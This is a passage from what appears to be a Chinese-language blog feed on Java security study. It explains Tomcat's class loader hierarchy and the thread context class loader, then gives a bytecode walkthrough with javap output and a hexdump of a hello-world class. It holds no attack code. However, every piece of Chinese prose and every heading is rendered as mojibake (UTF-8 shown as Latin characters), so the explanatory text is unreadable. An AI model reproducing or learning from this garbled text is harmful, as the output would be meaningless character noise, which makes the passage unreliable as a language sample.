&gt;/webapps/&lt;app&gt;/WEB-INF/*</code></li></ul><p>ä»å›¾ä¸­çš„å§”æ´¾å…³ç³»ä¸­å¯ä»¥çœ‹å‡ºï¼š</p><ul><li><code>CommonClassLoader</code>ä½œä¸º <code>CatalinaClassLoader</code> å’Œ <code>SharedClassLoader</code> çš„çˆ¶åŠ è½½å™¨ã€‚<code>CommonClassLoader</code> èƒ½åŠ è½½çš„ç±»éƒ½å¯ä»¥è¢« <code>CatalinaClassLoader</code> å’Œ <code>SharedClassLoader</code> ä½¿ç”¨ã€‚å› æ­¤ï¼Œ<code>CommonClassLoader</code> æ˜¯ä¸ºäº†å®ç°å…¬å…±ç±»åº“ï¼ˆå¯ä»¥è¢«æ‰€æœ‰ Web åº”ç”¨å’Œ Tomcat å†…éƒ¨ç»„ä»¶ä½¿ç”¨çš„ç±»åº“ï¼‰çš„å…±äº«å’Œéš”ç¦»ã€‚</li><li><code>CatalinaClassLoader</code> å’Œ <code>SharedClassLoader</code> èƒ½åŠ è½½çš„ç±»åˆ™ä¸å¯¹æ–¹ç›¸äº’éš”ç¦»ã€‚<code>CatalinaClassLoader</code> ç”¨äºåŠ è½½ Tomcat è‡ªèº«çš„ç±»ï¼Œä¸ºäº†éš”ç¦» Tomcat æœ¬èº«çš„ç±»å’Œ Web åº”ç”¨çš„ç±»ã€‚<code>SharedClassLoader</code> ä½œä¸º <code>WebAppClassLoader</code> çš„çˆ¶åŠ è½½å™¨ï¼Œä¸“é—¨æ¥åŠ è½½ Web åº”ç”¨ä¹‹é—´å…±äº«çš„ç±»æ¯”å¦‚ Springã€Mybatisã€‚</li><li>æ¯ä¸ª Web åº”ç”¨éƒ½ä¼šåˆ›å»ºä¸€ä¸ªå•ç‹¬çš„ <code>WebAppClassLoader</code>ï¼Œå¹¶åœ¨å¯åŠ¨ Web åº”ç”¨çš„çº¿ç¨‹é‡Œè®¾ç½®çº¿ç¨‹çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ä¸º <code>WebAppClassLoader</code>ã€‚å„ä¸ª <code>WebAppClassLoader</code> å®ä¾‹ä¹‹é—´ç›¸äº’éš”ç¦»ï¼Œè¿›è€Œå®ç° Web åº”ç”¨ä¹‹é—´çš„ç±»éš”ã€‚</li></ul><p>å•çº¯ä¾é è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ²¡åŠæ³•æ»¡è¶³æŸäº›åœºæ™¯çš„è¦æ±‚ï¼Œä¾‹å¦‚ï¼Œæœ‰äº›æƒ…å†µä¸‹ï¼Œé«˜å±‚çš„ç±»åŠ è½½å™¨éœ€è¦åŠ è½½ä½å±‚çš„åŠ è½½å™¨æ‰èƒ½åŠ è½½çš„ç±»ã€‚</p><p>æ¯”å¦‚ï¼ŒSPI ä¸­ï¼ŒSPI çš„æ¥å£ï¼ˆå¦‚ <code>java.sql.Driver</code>ï¼‰æ˜¯ç”± Java æ ¸å¿ƒåº“æä¾›çš„ï¼Œç”±<code>BootstrapClassLoader</code> åŠ è½½ã€‚è€Œ SPI çš„å®ç°ï¼ˆå¦‚<code>com.mysql.cj.jdbc.Driver</code>ï¼‰æ˜¯ç”±ç¬¬ä¸‰æ–¹ä¾›åº”å•†æä¾›çš„ï¼Œå®ƒä»¬æ˜¯ç”±åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨æˆ–è€…è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ¥åŠ è½½çš„ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ä¸ªç±»åŠå…¶ä¾èµ–ç±»ç”±åŒä¸€ä¸ªç±»åŠ è½½å™¨åŠ è½½ã€‚æ‰€ä»¥ï¼ŒåŠ è½½ SPI çš„æ¥å£çš„ç±»åŠ è½½å™¨ï¼ˆ<code>BootstrapClassLoader</code>ï¼‰ä¹Ÿä¼šç”¨æ¥åŠ è½½ SPI çš„å®ç°ã€‚æŒ‰ç…§åŒäº²å§”æ´¾æ¨¡å‹ï¼Œ<code>BootstrapClassLoader</code> æ˜¯æ— æ³•æ‰¾åˆ° SPI çš„å®ç°ç±»çš„ï¼Œå› ä¸ºå®ƒæ— æ³•å§”æ‰˜ç»™å­ç±»åŠ è½½å™¨å»å°è¯•åŠ è½½ã€‚</p><p>å†æ¯”å¦‚ï¼Œå‡è®¾æˆ‘ä»¬çš„é¡¹ç›®ä¸­æœ‰ Spring çš„ jar åŒ…ï¼Œç”±äºå…¶æ˜¯ Web åº”ç”¨ä¹‹é—´å…±äº«çš„ï¼Œå› æ­¤ä¼šç”± <code>SharedClassLoader</code> åŠ è½½ï¼ˆWeb æœåŠ¡å™¨æ˜¯ Tomcatï¼‰ã€‚æˆ‘ä»¬é¡¹ç›®ä¸­æœ‰ä¸€äº›ç”¨åˆ°äº† Spring çš„ä¸šåŠ¡ç±»ï¼Œæ¯”å¦‚å®ç°äº† Spring æä¾›çš„æ¥å£ã€ç”¨åˆ°äº† Spring æä¾›çš„æ³¨è§£ã€‚æ‰€ä»¥ï¼ŒåŠ è½½ Spring çš„ç±»åŠ è½½å™¨ï¼ˆä¹Ÿå°±æ˜¯ <code>SharedClassLoader</code>ï¼‰ä¹Ÿä¼šç”¨æ¥åŠ è½½è¿™äº›ä¸šåŠ¡ç±»ã€‚ä½†æ˜¯ä¸šåŠ¡ç±»åœ¨ Web åº”ç”¨ç›®å½•ä¸‹ï¼Œä¸åœ¨ <code>SharedClassLoader</code> çš„åŠ è½½è·¯å¾„ä¸‹ï¼Œæ‰€ä»¥ <code>SharedClassLoader</code> æ— æ³•æ‰¾åˆ°ä¸šåŠ¡ç±»ï¼Œä¹Ÿå°±æ— æ³•åŠ è½½å®ƒä»¬ã€‚</p><p>å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ è¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ° <strong>çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ï¼ˆ</strong><code>**ThreadContextClassLoader**</code><strong>ï¼‰</strong> äº†ã€‚</p><p>æ‹¿ Spring è¿™ä¸ªä¾‹å­æ¥è¯´ï¼Œå½“ Spring éœ€è¦åŠ è½½ä¸šåŠ¡ç±»çš„æ—¶å€™ï¼Œå®ƒä¸æ˜¯ç”¨è‡ªå·±çš„ç±»åŠ è½½å™¨ï¼Œè€Œæ˜¯ç”¨å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ã€‚è¿˜è®°å¾—æˆ‘ä¸Šé¢è¯´çš„å—ï¼Ÿæ¯ä¸ª Web åº”ç”¨éƒ½ä¼šåˆ›å»ºä¸€ä¸ªå•ç‹¬çš„ <code>WebAppClassLoader</code>ï¼Œå¹¶åœ¨å¯åŠ¨ Web åº”ç”¨çš„çº¿ç¨‹é‡Œè®¾ç½®çº¿ç¨‹çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ä¸º <code>WebAppClassLoader</code>ã€‚è¿™æ ·å°±å¯ä»¥è®©é«˜å±‚çš„ç±»åŠ è½½å™¨ï¼ˆ<code>SharedClassLoader</code>ï¼‰å€ŸåŠ©å­ç±»åŠ è½½å™¨ï¼ˆ <code>WebAppClassLoader</code>ï¼‰æ¥åŠ è½½ä¸šåŠ¡ç±»ï¼Œç ´åäº† Java çš„ç±»åŠ è½½å§”æ‰˜æœºåˆ¶ï¼Œè®©åº”ç”¨é€†å‘ä½¿ç”¨ç±»åŠ è½½å™¨ã€‚</p><p>çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨çš„åŸç†æ˜¯å°†ä¸€ä¸ªç±»åŠ è½½å™¨ä¿å­˜åœ¨çº¿ç¨‹ç§æœ‰æ•°æ®é‡Œï¼Œè·Ÿçº¿ç¨‹ç»‘å®šï¼Œç„¶ååœ¨éœ€è¦çš„æ—¶å€™å–å‡ºæ¥ä½¿ç”¨ã€‚è¿™ä¸ªç±»åŠ è½½å™¨é€šå¸¸æ˜¯ç”±åº”ç”¨ç¨‹åºæˆ–è€…å®¹å™¨ï¼ˆå¦‚ Tomcatï¼‰è®¾ç½®çš„ã€‚</p><p><code>Java.lang.Thread</code> ä¸­çš„<code>getContextClassLoader()</code>å’Œ <code>setContextClassLoader(ClassLoader cl)</code>åˆ†åˆ«ç”¨æ¥è·å–å’Œè®¾ç½®çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ã€‚å¦‚æœæ²¡æœ‰é€šè¿‡<code>setContextClassLoader(ClassLoader cl)</code>è¿›è¡Œè®¾ç½®çš„è¯ï¼Œçº¿ç¨‹å°†ç»§æ‰¿å…¶çˆ¶çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ã€‚</p><p>Spring è·å–çº¿ç¨‹çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl = Thread.currentThread().getContextClassLoader();</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://javaguide.cn/java/jvm/classloader.html#%E6%89%93%E7%A0%B4%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B%E6%96%B9%E6%B3%95">https://javaguide.cn/java/jvm/classloader.html#%E6%89%93%E7%A0%B4%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B%E6%96%B9%E6%B3%95</a></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> web </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> å®‰å…¨ç ”ç©¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jvmå’Œå­—èŠ‚ç </title>
      <link href="/2024/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jvm%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>/2024/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/jvm%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="jvmä»¥åŠå­—èŠ‚ç ä»‹ç»"><a href="#jvmä»¥åŠå­—èŠ‚ç ä»‹ç»" class="headerlink" title="jvmä»¥åŠå­—èŠ‚ç ä»‹ç»"></a>jvmä»¥åŠå­—èŠ‚ç ä»‹ç»</h2><h3 id="jvmä»‹ç»"><a href="#jvmä»‹ç»" class="headerlink" title="jvmä»‹ç»"></a>jvmä»‹ç»</h3><p>åœ¨ä»‹ç»ç±»åŠ è½½å™¨ï¼ˆClassLoaderï¼‰å’Œå…¶æœºåˆ¶ä¹‹å‰å…ˆä»‹ç»JVMï¼ŒJVM å¤§è‡´å¯ä»¥åˆ’åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯ç±»åŠ è½½å™¨ï¼ˆClass Loaderï¼‰ã€è¿è¡Œæ—¶æ•°æ®åŒºï¼ˆRuntime Data Areasï¼‰å’Œæ‰§è¡Œå¼•æ“ï¼ˆExcution Engineï¼‰ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742453170636-1a944b29-d659-4338-97f3-a18d4ba66d6e.png"></p><p>ä¸‰ä¸ªéƒ¨åˆ†å…·ä½“åˆæ˜¯å¹²ä»€ä¹ˆçš„ï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢è¿™å¹…å›¾æ¥äº†è§£</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742453212427-1aba0a5b-09c7-4d51-9ae4-a8d0b90805a7.png"></p><p>Javaç¨‹åºåœ¨è¿è¡Œå‰éœ€è¦å…ˆç¼–è¯‘æˆ<code>classæ–‡ä»¶</code>ï¼ŒJavaç±»åˆå§‹åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨<code>java.lang.ClassLoader</code>åŠ è½½ç±»å­—èŠ‚ç ï¼Œ<code>ClassLoader</code>ä¼šè°ƒç”¨JVMçš„nativeæ–¹æ³•ï¼ˆ<code>defineClass0/1/2</code>ï¼‰æ¥å®šä¹‰ä¸€ä¸ª<code>java.lang.Class</code>å®ä¾‹ï¼Œé€šè¿‡ä¸Šè¿°è§£é‡Šå¯ä»¥çŸ¥é“ç±»çš„åŠ è½½å°±æ˜¯ç”±javaç±»åŠ è½½å™¨å®ç°çš„ã€‚</p><h3 id="å­—èŠ‚ç "><a href="#å­—èŠ‚ç " class="headerlink" title="å­—èŠ‚ç "></a>å­—èŠ‚ç </h3><p>ç¼–å†™ä¸€ä¸ªç±»æ–‡ä»¶æµ‹è¯•ä¸€ä¸‹ï¼Œä»¥æœ€ç®€å•çš„helloworldä¸ºä¾‹å­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        System.out.println(&quot;hello world&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742454591379-81c06b5a-c7a5-4e54-9781-a66fdf10234b.png"></p><p>è¿è¡Œä¹‹ååœ¨target&#x2F;classes&#x2F;org&#x2F;exampleç›®å½•ä¸‹å‘ç°äº†classæ–‡ä»¶ï¼Œé‡Œé¢çš„ä»£ç å’Œæºç ä¸ºä»€ä¹ˆä¼šä¸€æ ·ï¼Ÿæ˜¯å› ä¸ºIDEAé»˜è®¤ä½¿ç”¨<a href="https://github.com/fesh0r/fernflower">Fernflower</a>ï¼ˆåç¼–è¯‘å·¥å…·ï¼‰å°†å­—èŠ‚ç æ–‡ä»¶ï¼ˆ.classï¼Œjavaæºä»£ç ç¼–è¯‘åçš„æ–‡ä»¶ï¼‰åç¼–è¯‘ä¸ºæˆ‘ä»¬çœ‹çš„æ‡‚çš„javaä»£ç ï¼Œé€šè¿‡view-&gt;show bytecodeå¯ä»¥çœ‹åˆ°å­—èŠ‚ç </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742454952892-57152fd1-e2db-40aa-a39b-120cbaa24e63.png"></p><p>å¯ä»¥ç”¨jclasslibæ’ä»¶</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742455692523-0db3a7ec-39fd-458e-97c1-ed30a3d47346.png"></p><p>å­—èŠ‚ç å¹¶ä¸æ˜¯æœºå™¨ç ï¼Œæ“ä½œç³»ç»Ÿæ— æ³•ç›´æ¥è¯†åˆ«ï¼Œéœ€è¦åœ¨æ“ä½œç³»ç»Ÿä¸Šå®‰è£…ä¸åŒç‰ˆæœ¬çš„ <a href="https://javabetter.cn/jvm/what-is-jvm.html">JVM</a> æ¥è¯†åˆ«ã€‚</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªéœ€è¦å®‰è£…ä¸åŒç‰ˆæœ¬çš„ JDKï¼ˆJava Development Kitï¼ŒJava å¼€å‘å·¥å…·åŒ…ï¼‰å°±è¡Œäº†ï¼Œå®ƒé‡Œé¢åŒ…å«äº† JREï¼ˆJava Runtime Environmentï¼ŒJava è¿è¡Œæ—¶ç¯å¢ƒï¼‰ï¼Œè€Œ JRE åˆåŒ…å«äº† JVMã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742455032057-787ca7bd-f203-4429-971e-9176d21cc0e7.png"></p><p>javapæ˜¯javaå†…ç½®çš„åç¼–è¯‘å·¥å…·ï¼Œç”¨javap -v -p Main.classçœ‹ä¸€ä¸‹åˆšæ‰çš„classæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">Classfile /Users/apple/Documents/javacode/classloader/target/classes/org/example/Main.class</span><br><span class="line">  Last modified 2025-3-20; size 539 bytes</span><br><span class="line">  MD5 checksum a848fbf47800b5f4f1d56bc08b626ee5</span><br><span class="line">  Compiled from &quot;Main.java&quot;</span><br><span class="line">public class org.example.Main</span><br><span class="line">  minor version: 0</span><br><span class="line">  major version: 52</span><br><span class="line">  flags: ACC_PUBLIC, ACC_SUPER</span><br><span class="line">Constant pool:</span><br><span class="line">   #1 = Methodref          #6.#20         // java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">   #2 = Fieldref           #21.#22        // java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">   #3 = String             #23            // hello world</span><br><span class="line">   #4 = Methodref          #24.#25        // java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">   #5 = Class              #26            // org/example/Main</span><br><span class="line">   #6 = Class              #27            // java/lang/Object</span><br><span class="line">   #7 = Utf8               &lt;init&gt;</span><br><span class="line">   #8 = Utf8               ()V</span><br><span class="line">   #9 = Utf8               Code</span><br><span class="line">  #10 = Utf8               LineNumberTable</span><br><span class="line">  #11 = Utf8               LocalVariableTable</span><br><span class="line">  #12 = Utf8               this</span><br><span class="line">  #13 = Utf8               Lorg/example/Main;</span><br><span class="line">  #14 = Utf8               main</span><br><span class="line">  #15 = Utf8               ([Ljava/lang/String;)V</span><br><span class="line">  #16 = Utf8               args</span><br><span class="line">  #17 = Utf8               [Ljava/lang/String;</span><br><span class="line">  #18 = Utf8               SourceFile</span><br><span class="line">  #19 = Utf8               Main.java</span><br><span class="line">  #20 = NameAndType        #7:#8          // &quot;&lt;init&gt;&quot;:()V</span><br><span class="line">  #21 = Class              #28            // java/lang/System</span><br><span class="line">  #22 = NameAndType        #29:#30        // out:Ljava/io/PrintStream;</span><br><span class="line">  #23 = Utf8               hello world</span><br><span class="line">  #24 = Class              #31            // java/io/PrintStream</span><br><span class="line">  #25 = NameAndType        #32:#33        // println:(Ljava/lang/String;)V</span><br><span class="line">  #26 = Utf8               org/example/Main</span><br><span class="line">  #27 = Utf8               java/lang/Object</span><br><span class="line">  #28 = Utf8               java/lang/System</span><br><span class="line">  #29 = Utf8               out</span><br><span class="line">  #30 = Utf8               Ljava/io/PrintStream;</span><br><span class="line">  #31 = Utf8               java/io/PrintStream</span><br><span class="line">  #32 = Utf8               println</span><br><span class="line">  #33 = Utf8               (Ljava/lang/String;)V</span><br><span class="line">&#123;</span><br><span class="line">  public org.example.Main();</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=1, locals=1, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: invokespecial #1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">         4: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 5: 0</span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            0       5     0  this   Lorg/example/Main;</span><br><span class="line"></span><br><span class="line">  public static void main(java.lang.String[]);</span><br><span class="line">    descriptor: ([Ljava/lang/String;)V</span><br><span class="line">    flags: ACC_PUBLIC, ACC_STATIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=2, locals=1, args_size=1</span><br><span class="line">         0: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">         3: ldc           #3                  // String hello world</span><br><span class="line">         5: invokevirtual #4                  // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">         8: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 7: 0</span><br><span class="line">        line 8: 8</span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            0       9     0  args   [Ljava/lang/String;</span><br><span class="line">&#125;</span><br><span class="line">SourceFile: &quot;Main.java&quot;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°ä¸Šé¢Codeï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">3: ldc           #3                  // String hello world</span><br><span class="line">5: invokevirtual #4                  // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">8: return</span><br></pre></td></tr></table></figure><p>å­—èŠ‚ç æŒ‡ä»¤åºåˆ—é€šå¸¸ç”±å¤šæ¡æŒ‡ä»¤ç»„æˆï¼Œæ¯æ¡æŒ‡ä»¤ç”±ä¸€ä¸ªæ“ä½œç å’Œè‹¥å¹²ä¸ªæ“ä½œæ•°æ„æˆã€‚</p><ul><li>æ“ä½œç ï¼šä¸€ä¸ªå­—èŠ‚å¤§å°çš„æŒ‡ä»¤ï¼Œç”¨äºè¡¨ç¤ºå…·ä½“çš„æ“ä½œã€‚</li><li>æ“ä½œæ•°ï¼šè·Ÿéšæ“ä½œç ï¼Œç”¨äºæä¾›é¢å¤–ä¿¡æ¯ã€‚</li></ul><p>è¿™æ®µå­—èŠ‚ç åºåˆ—çš„æ„æ€æ˜¯è°ƒç”¨ System.out.println æ–¹æ³•æ‰“å°â€Hello Worldâ€å­—ç¬¦ä¸²ã€‚ä¸‹é¢æ˜¯è¯¦ç»†çš„è§£é‡Šï¼š</p><p>â‘ ã€<code>0: getstatic #2 &lt;java/lang/System.out&gt;</code>ï¼š</p><ul><li>æ“ä½œç ï¼šgetstatic</li><li>æ“ä½œæ•°ï¼š#2</li><li>æè¿°ï¼šè¿™æ¡æŒ‡ä»¤çš„ä½œç”¨æ˜¯è·å–é™æ€å­—æ®µï¼Œè¿™é‡Œè·å–çš„æ˜¯<code>java.lang.System</code>ç±»çš„<code>out</code>é™æ€å­—æ®µï¼Œå®ƒæ˜¯ä¸€ä¸ª<code>PrintStream</code>ç±»å‹çš„è¾“å‡ºæµã€‚#2 æ˜¯ä¸€ä¸ªæŒ‡å‘<a href="https://javabetter.cn/jvm/class-file-jiegou.html">å¸¸é‡æ± </a>çš„ç´¢å¼•ï¼Œåé¢åœ¨è®²ç±»æ–‡ä»¶ç»“æ„æ—¶ä¼šè®²åˆ°ã€‚</li></ul><p>â‘¡ã€<code>3: ldc #3 &lt;Hello World&gt;</code>ï¼š</p><ul><li>æ“ä½œç ï¼šldc</li><li>æ“ä½œæ•°ï¼š#3</li><li>æè¿°ï¼šè¿™æ¡æŒ‡ä»¤çš„ä½œç”¨æ˜¯ä»å¸¸é‡æ± ä¸­åŠ è½½ä¸€ä¸ªå¸¸é‡å€¼ï¼ˆå­—ç¬¦ä¸²â€Hello Worldâ€ï¼‰åˆ°æ“ä½œæ•°æ ˆé¡¶ã€‚#3 æ˜¯ä¸€ä¸ªæŒ‡å‘å¸¸é‡æ± çš„ç´¢å¼•ï¼Œå¸¸é‡æ± é‡Œå­˜å‚¨äº†å­—ç¬¦ä¸²â€Hello Worldâ€çš„å¼•ç”¨ã€‚</li></ul><p>â‘¢ã€<code>5: invokevirtual #4 &lt;java/io/PrintStream.println&gt;</code>ï¼š</p><ul><li>æ“ä½œç ï¼šinvokevirtual</li><li>æ“ä½œæ•°ï¼š#4</li><li>æè¿°ï¼šè¿™æ¡æŒ‡ä»¤çš„ä½œç”¨æ˜¯è°ƒç”¨æ–¹æ³•ã€‚è¿™é‡Œè°ƒç”¨çš„æ˜¯<code>PrintStream</code>ç±»çš„<code>println</code>æ–¹æ³•ï¼Œç”¨æ¥æ‰“å°å­—ç¬¦ä¸²ã€‚#4 æ˜¯ä¸€ä¸ªæŒ‡å‘å¸¸é‡æ± çš„ç´¢å¼•ï¼Œå¸¸é‡æ± é‡Œå­˜å‚¨äº†<code>java/io/PrintStream.println</code>æ–¹æ³•çš„å¼•ç”¨ä¿¡æ¯ã€‚</li></ul><p>â‘£ã€<code>8: return</code>ï¼š</p><ul><li>æ“ä½œç ï¼šreturn</li><li>æè¿°ï¼šè¿™æ¡æŒ‡ä»¤çš„ä½œç”¨æ˜¯ä»å½“å‰æ–¹æ³•è¿”å›ã€‚</li></ul><p>ä¸Šé¢çš„ getstaticã€ldcã€invokevirtualã€return ç­‰å°±æ˜¯ <a href="https://javabetter.cn/jvm/zijiema-zhiling.html">å­—èŠ‚ç æŒ‡ä»¤</a>çš„æ“ä½œç ã€‚</p><p>å¯ä»¥ä½¿ç”¨ <a href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E8%BD%AC%E5%82%A8">hexdump</a>ï¼Œä¸€ä¸ªåœ¨ Unix å’Œ Linux ç³»ç»Ÿä¸­å¸¸ç”¨çš„å·¥å…·ï¼Œç”¨äºä»¥åå…­è¿›åˆ¶çš„å½¢å¼æ˜¾ç¤ºæ–‡ä»¶çš„å†…å®¹ï¼Œçœ‹ä¸€ä¸‹å­—èŠ‚ç çš„äºŒè¿›åˆ¶å†…å®¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C Main.class</span><br><span class="line">00000000  ca fe ba be 00 00 00 34  00 22 0a 00 06 00 14 09  |ï¿½...4.&quot;......|</span><br><span class="line">00000010  00 15 00 16 08 00 17 0a  00 18 00 19 07 00 1a 07  |................|</span><br><span class="line">00000020  00 1b 01 00 06 3c 69 6e  69 74 3e 01 00 03 28 29  |.....&lt;init&gt;...()|</span><br><span class="line">00000030  56 01 00 04 43 6f 64 65  01 00 0f 4c 69 6e 65 4e  |V...Code...LineN|</span><br><span class="line">00000040  75 6d 62 65 72 54 61 62  6c 65 01 00 12 4c 6f 63  |umberTable...Loc|</span><br><span class="line">00000050  61 6c 56 61 72 69 61 62  6c 65 54 61 62 6c 65 01  |alVariableTable.|</span><br><span class="line">00000060  00 04 74 68 69 73 01 00  12 4c 6f 72 67 2f 65 78  |..this...Lorg/ex|</span><br><span class="line">00000070  61 6d 70 6c 65 2f 4d 61  69 6e 3b 01 00 04 6d 61  |ample/Main;...ma|</span><br><span class="line">00000080  69 6e 01 00 16 28 5b 4c  6a 61 76 61 2f 6c 61 6e  |in...([Ljava/lan|</span><br><span class="line">00000090  67 2f 53 74 72 69 6e 67  3b 29 56 01 00 04 61 72  |g/String;)V...ar|</span><br><span class="line">000000a0  67 73 01 00 13 5b 4c 6a  61 76 61 2f 6c 61 6e 67  |gs...[Ljava/lang|</span><br><span class="line">000000b0  2f 53 74 72 69 6e 67 3b  01 00 0a 53 6f 75 72 63  |/String;...Sourc|</span><br><span class="line">000000c0  65 46 69 6c 65 01 00 09  4d 61 69 6e 2e 6a 61 76  |eFile...Main.jav|</span><br><span class="line">000000d0  61 0c 00 07 00 08 07 00  1c 0c 00 1d 00 1e 01 00  |a...............|</span><br><span 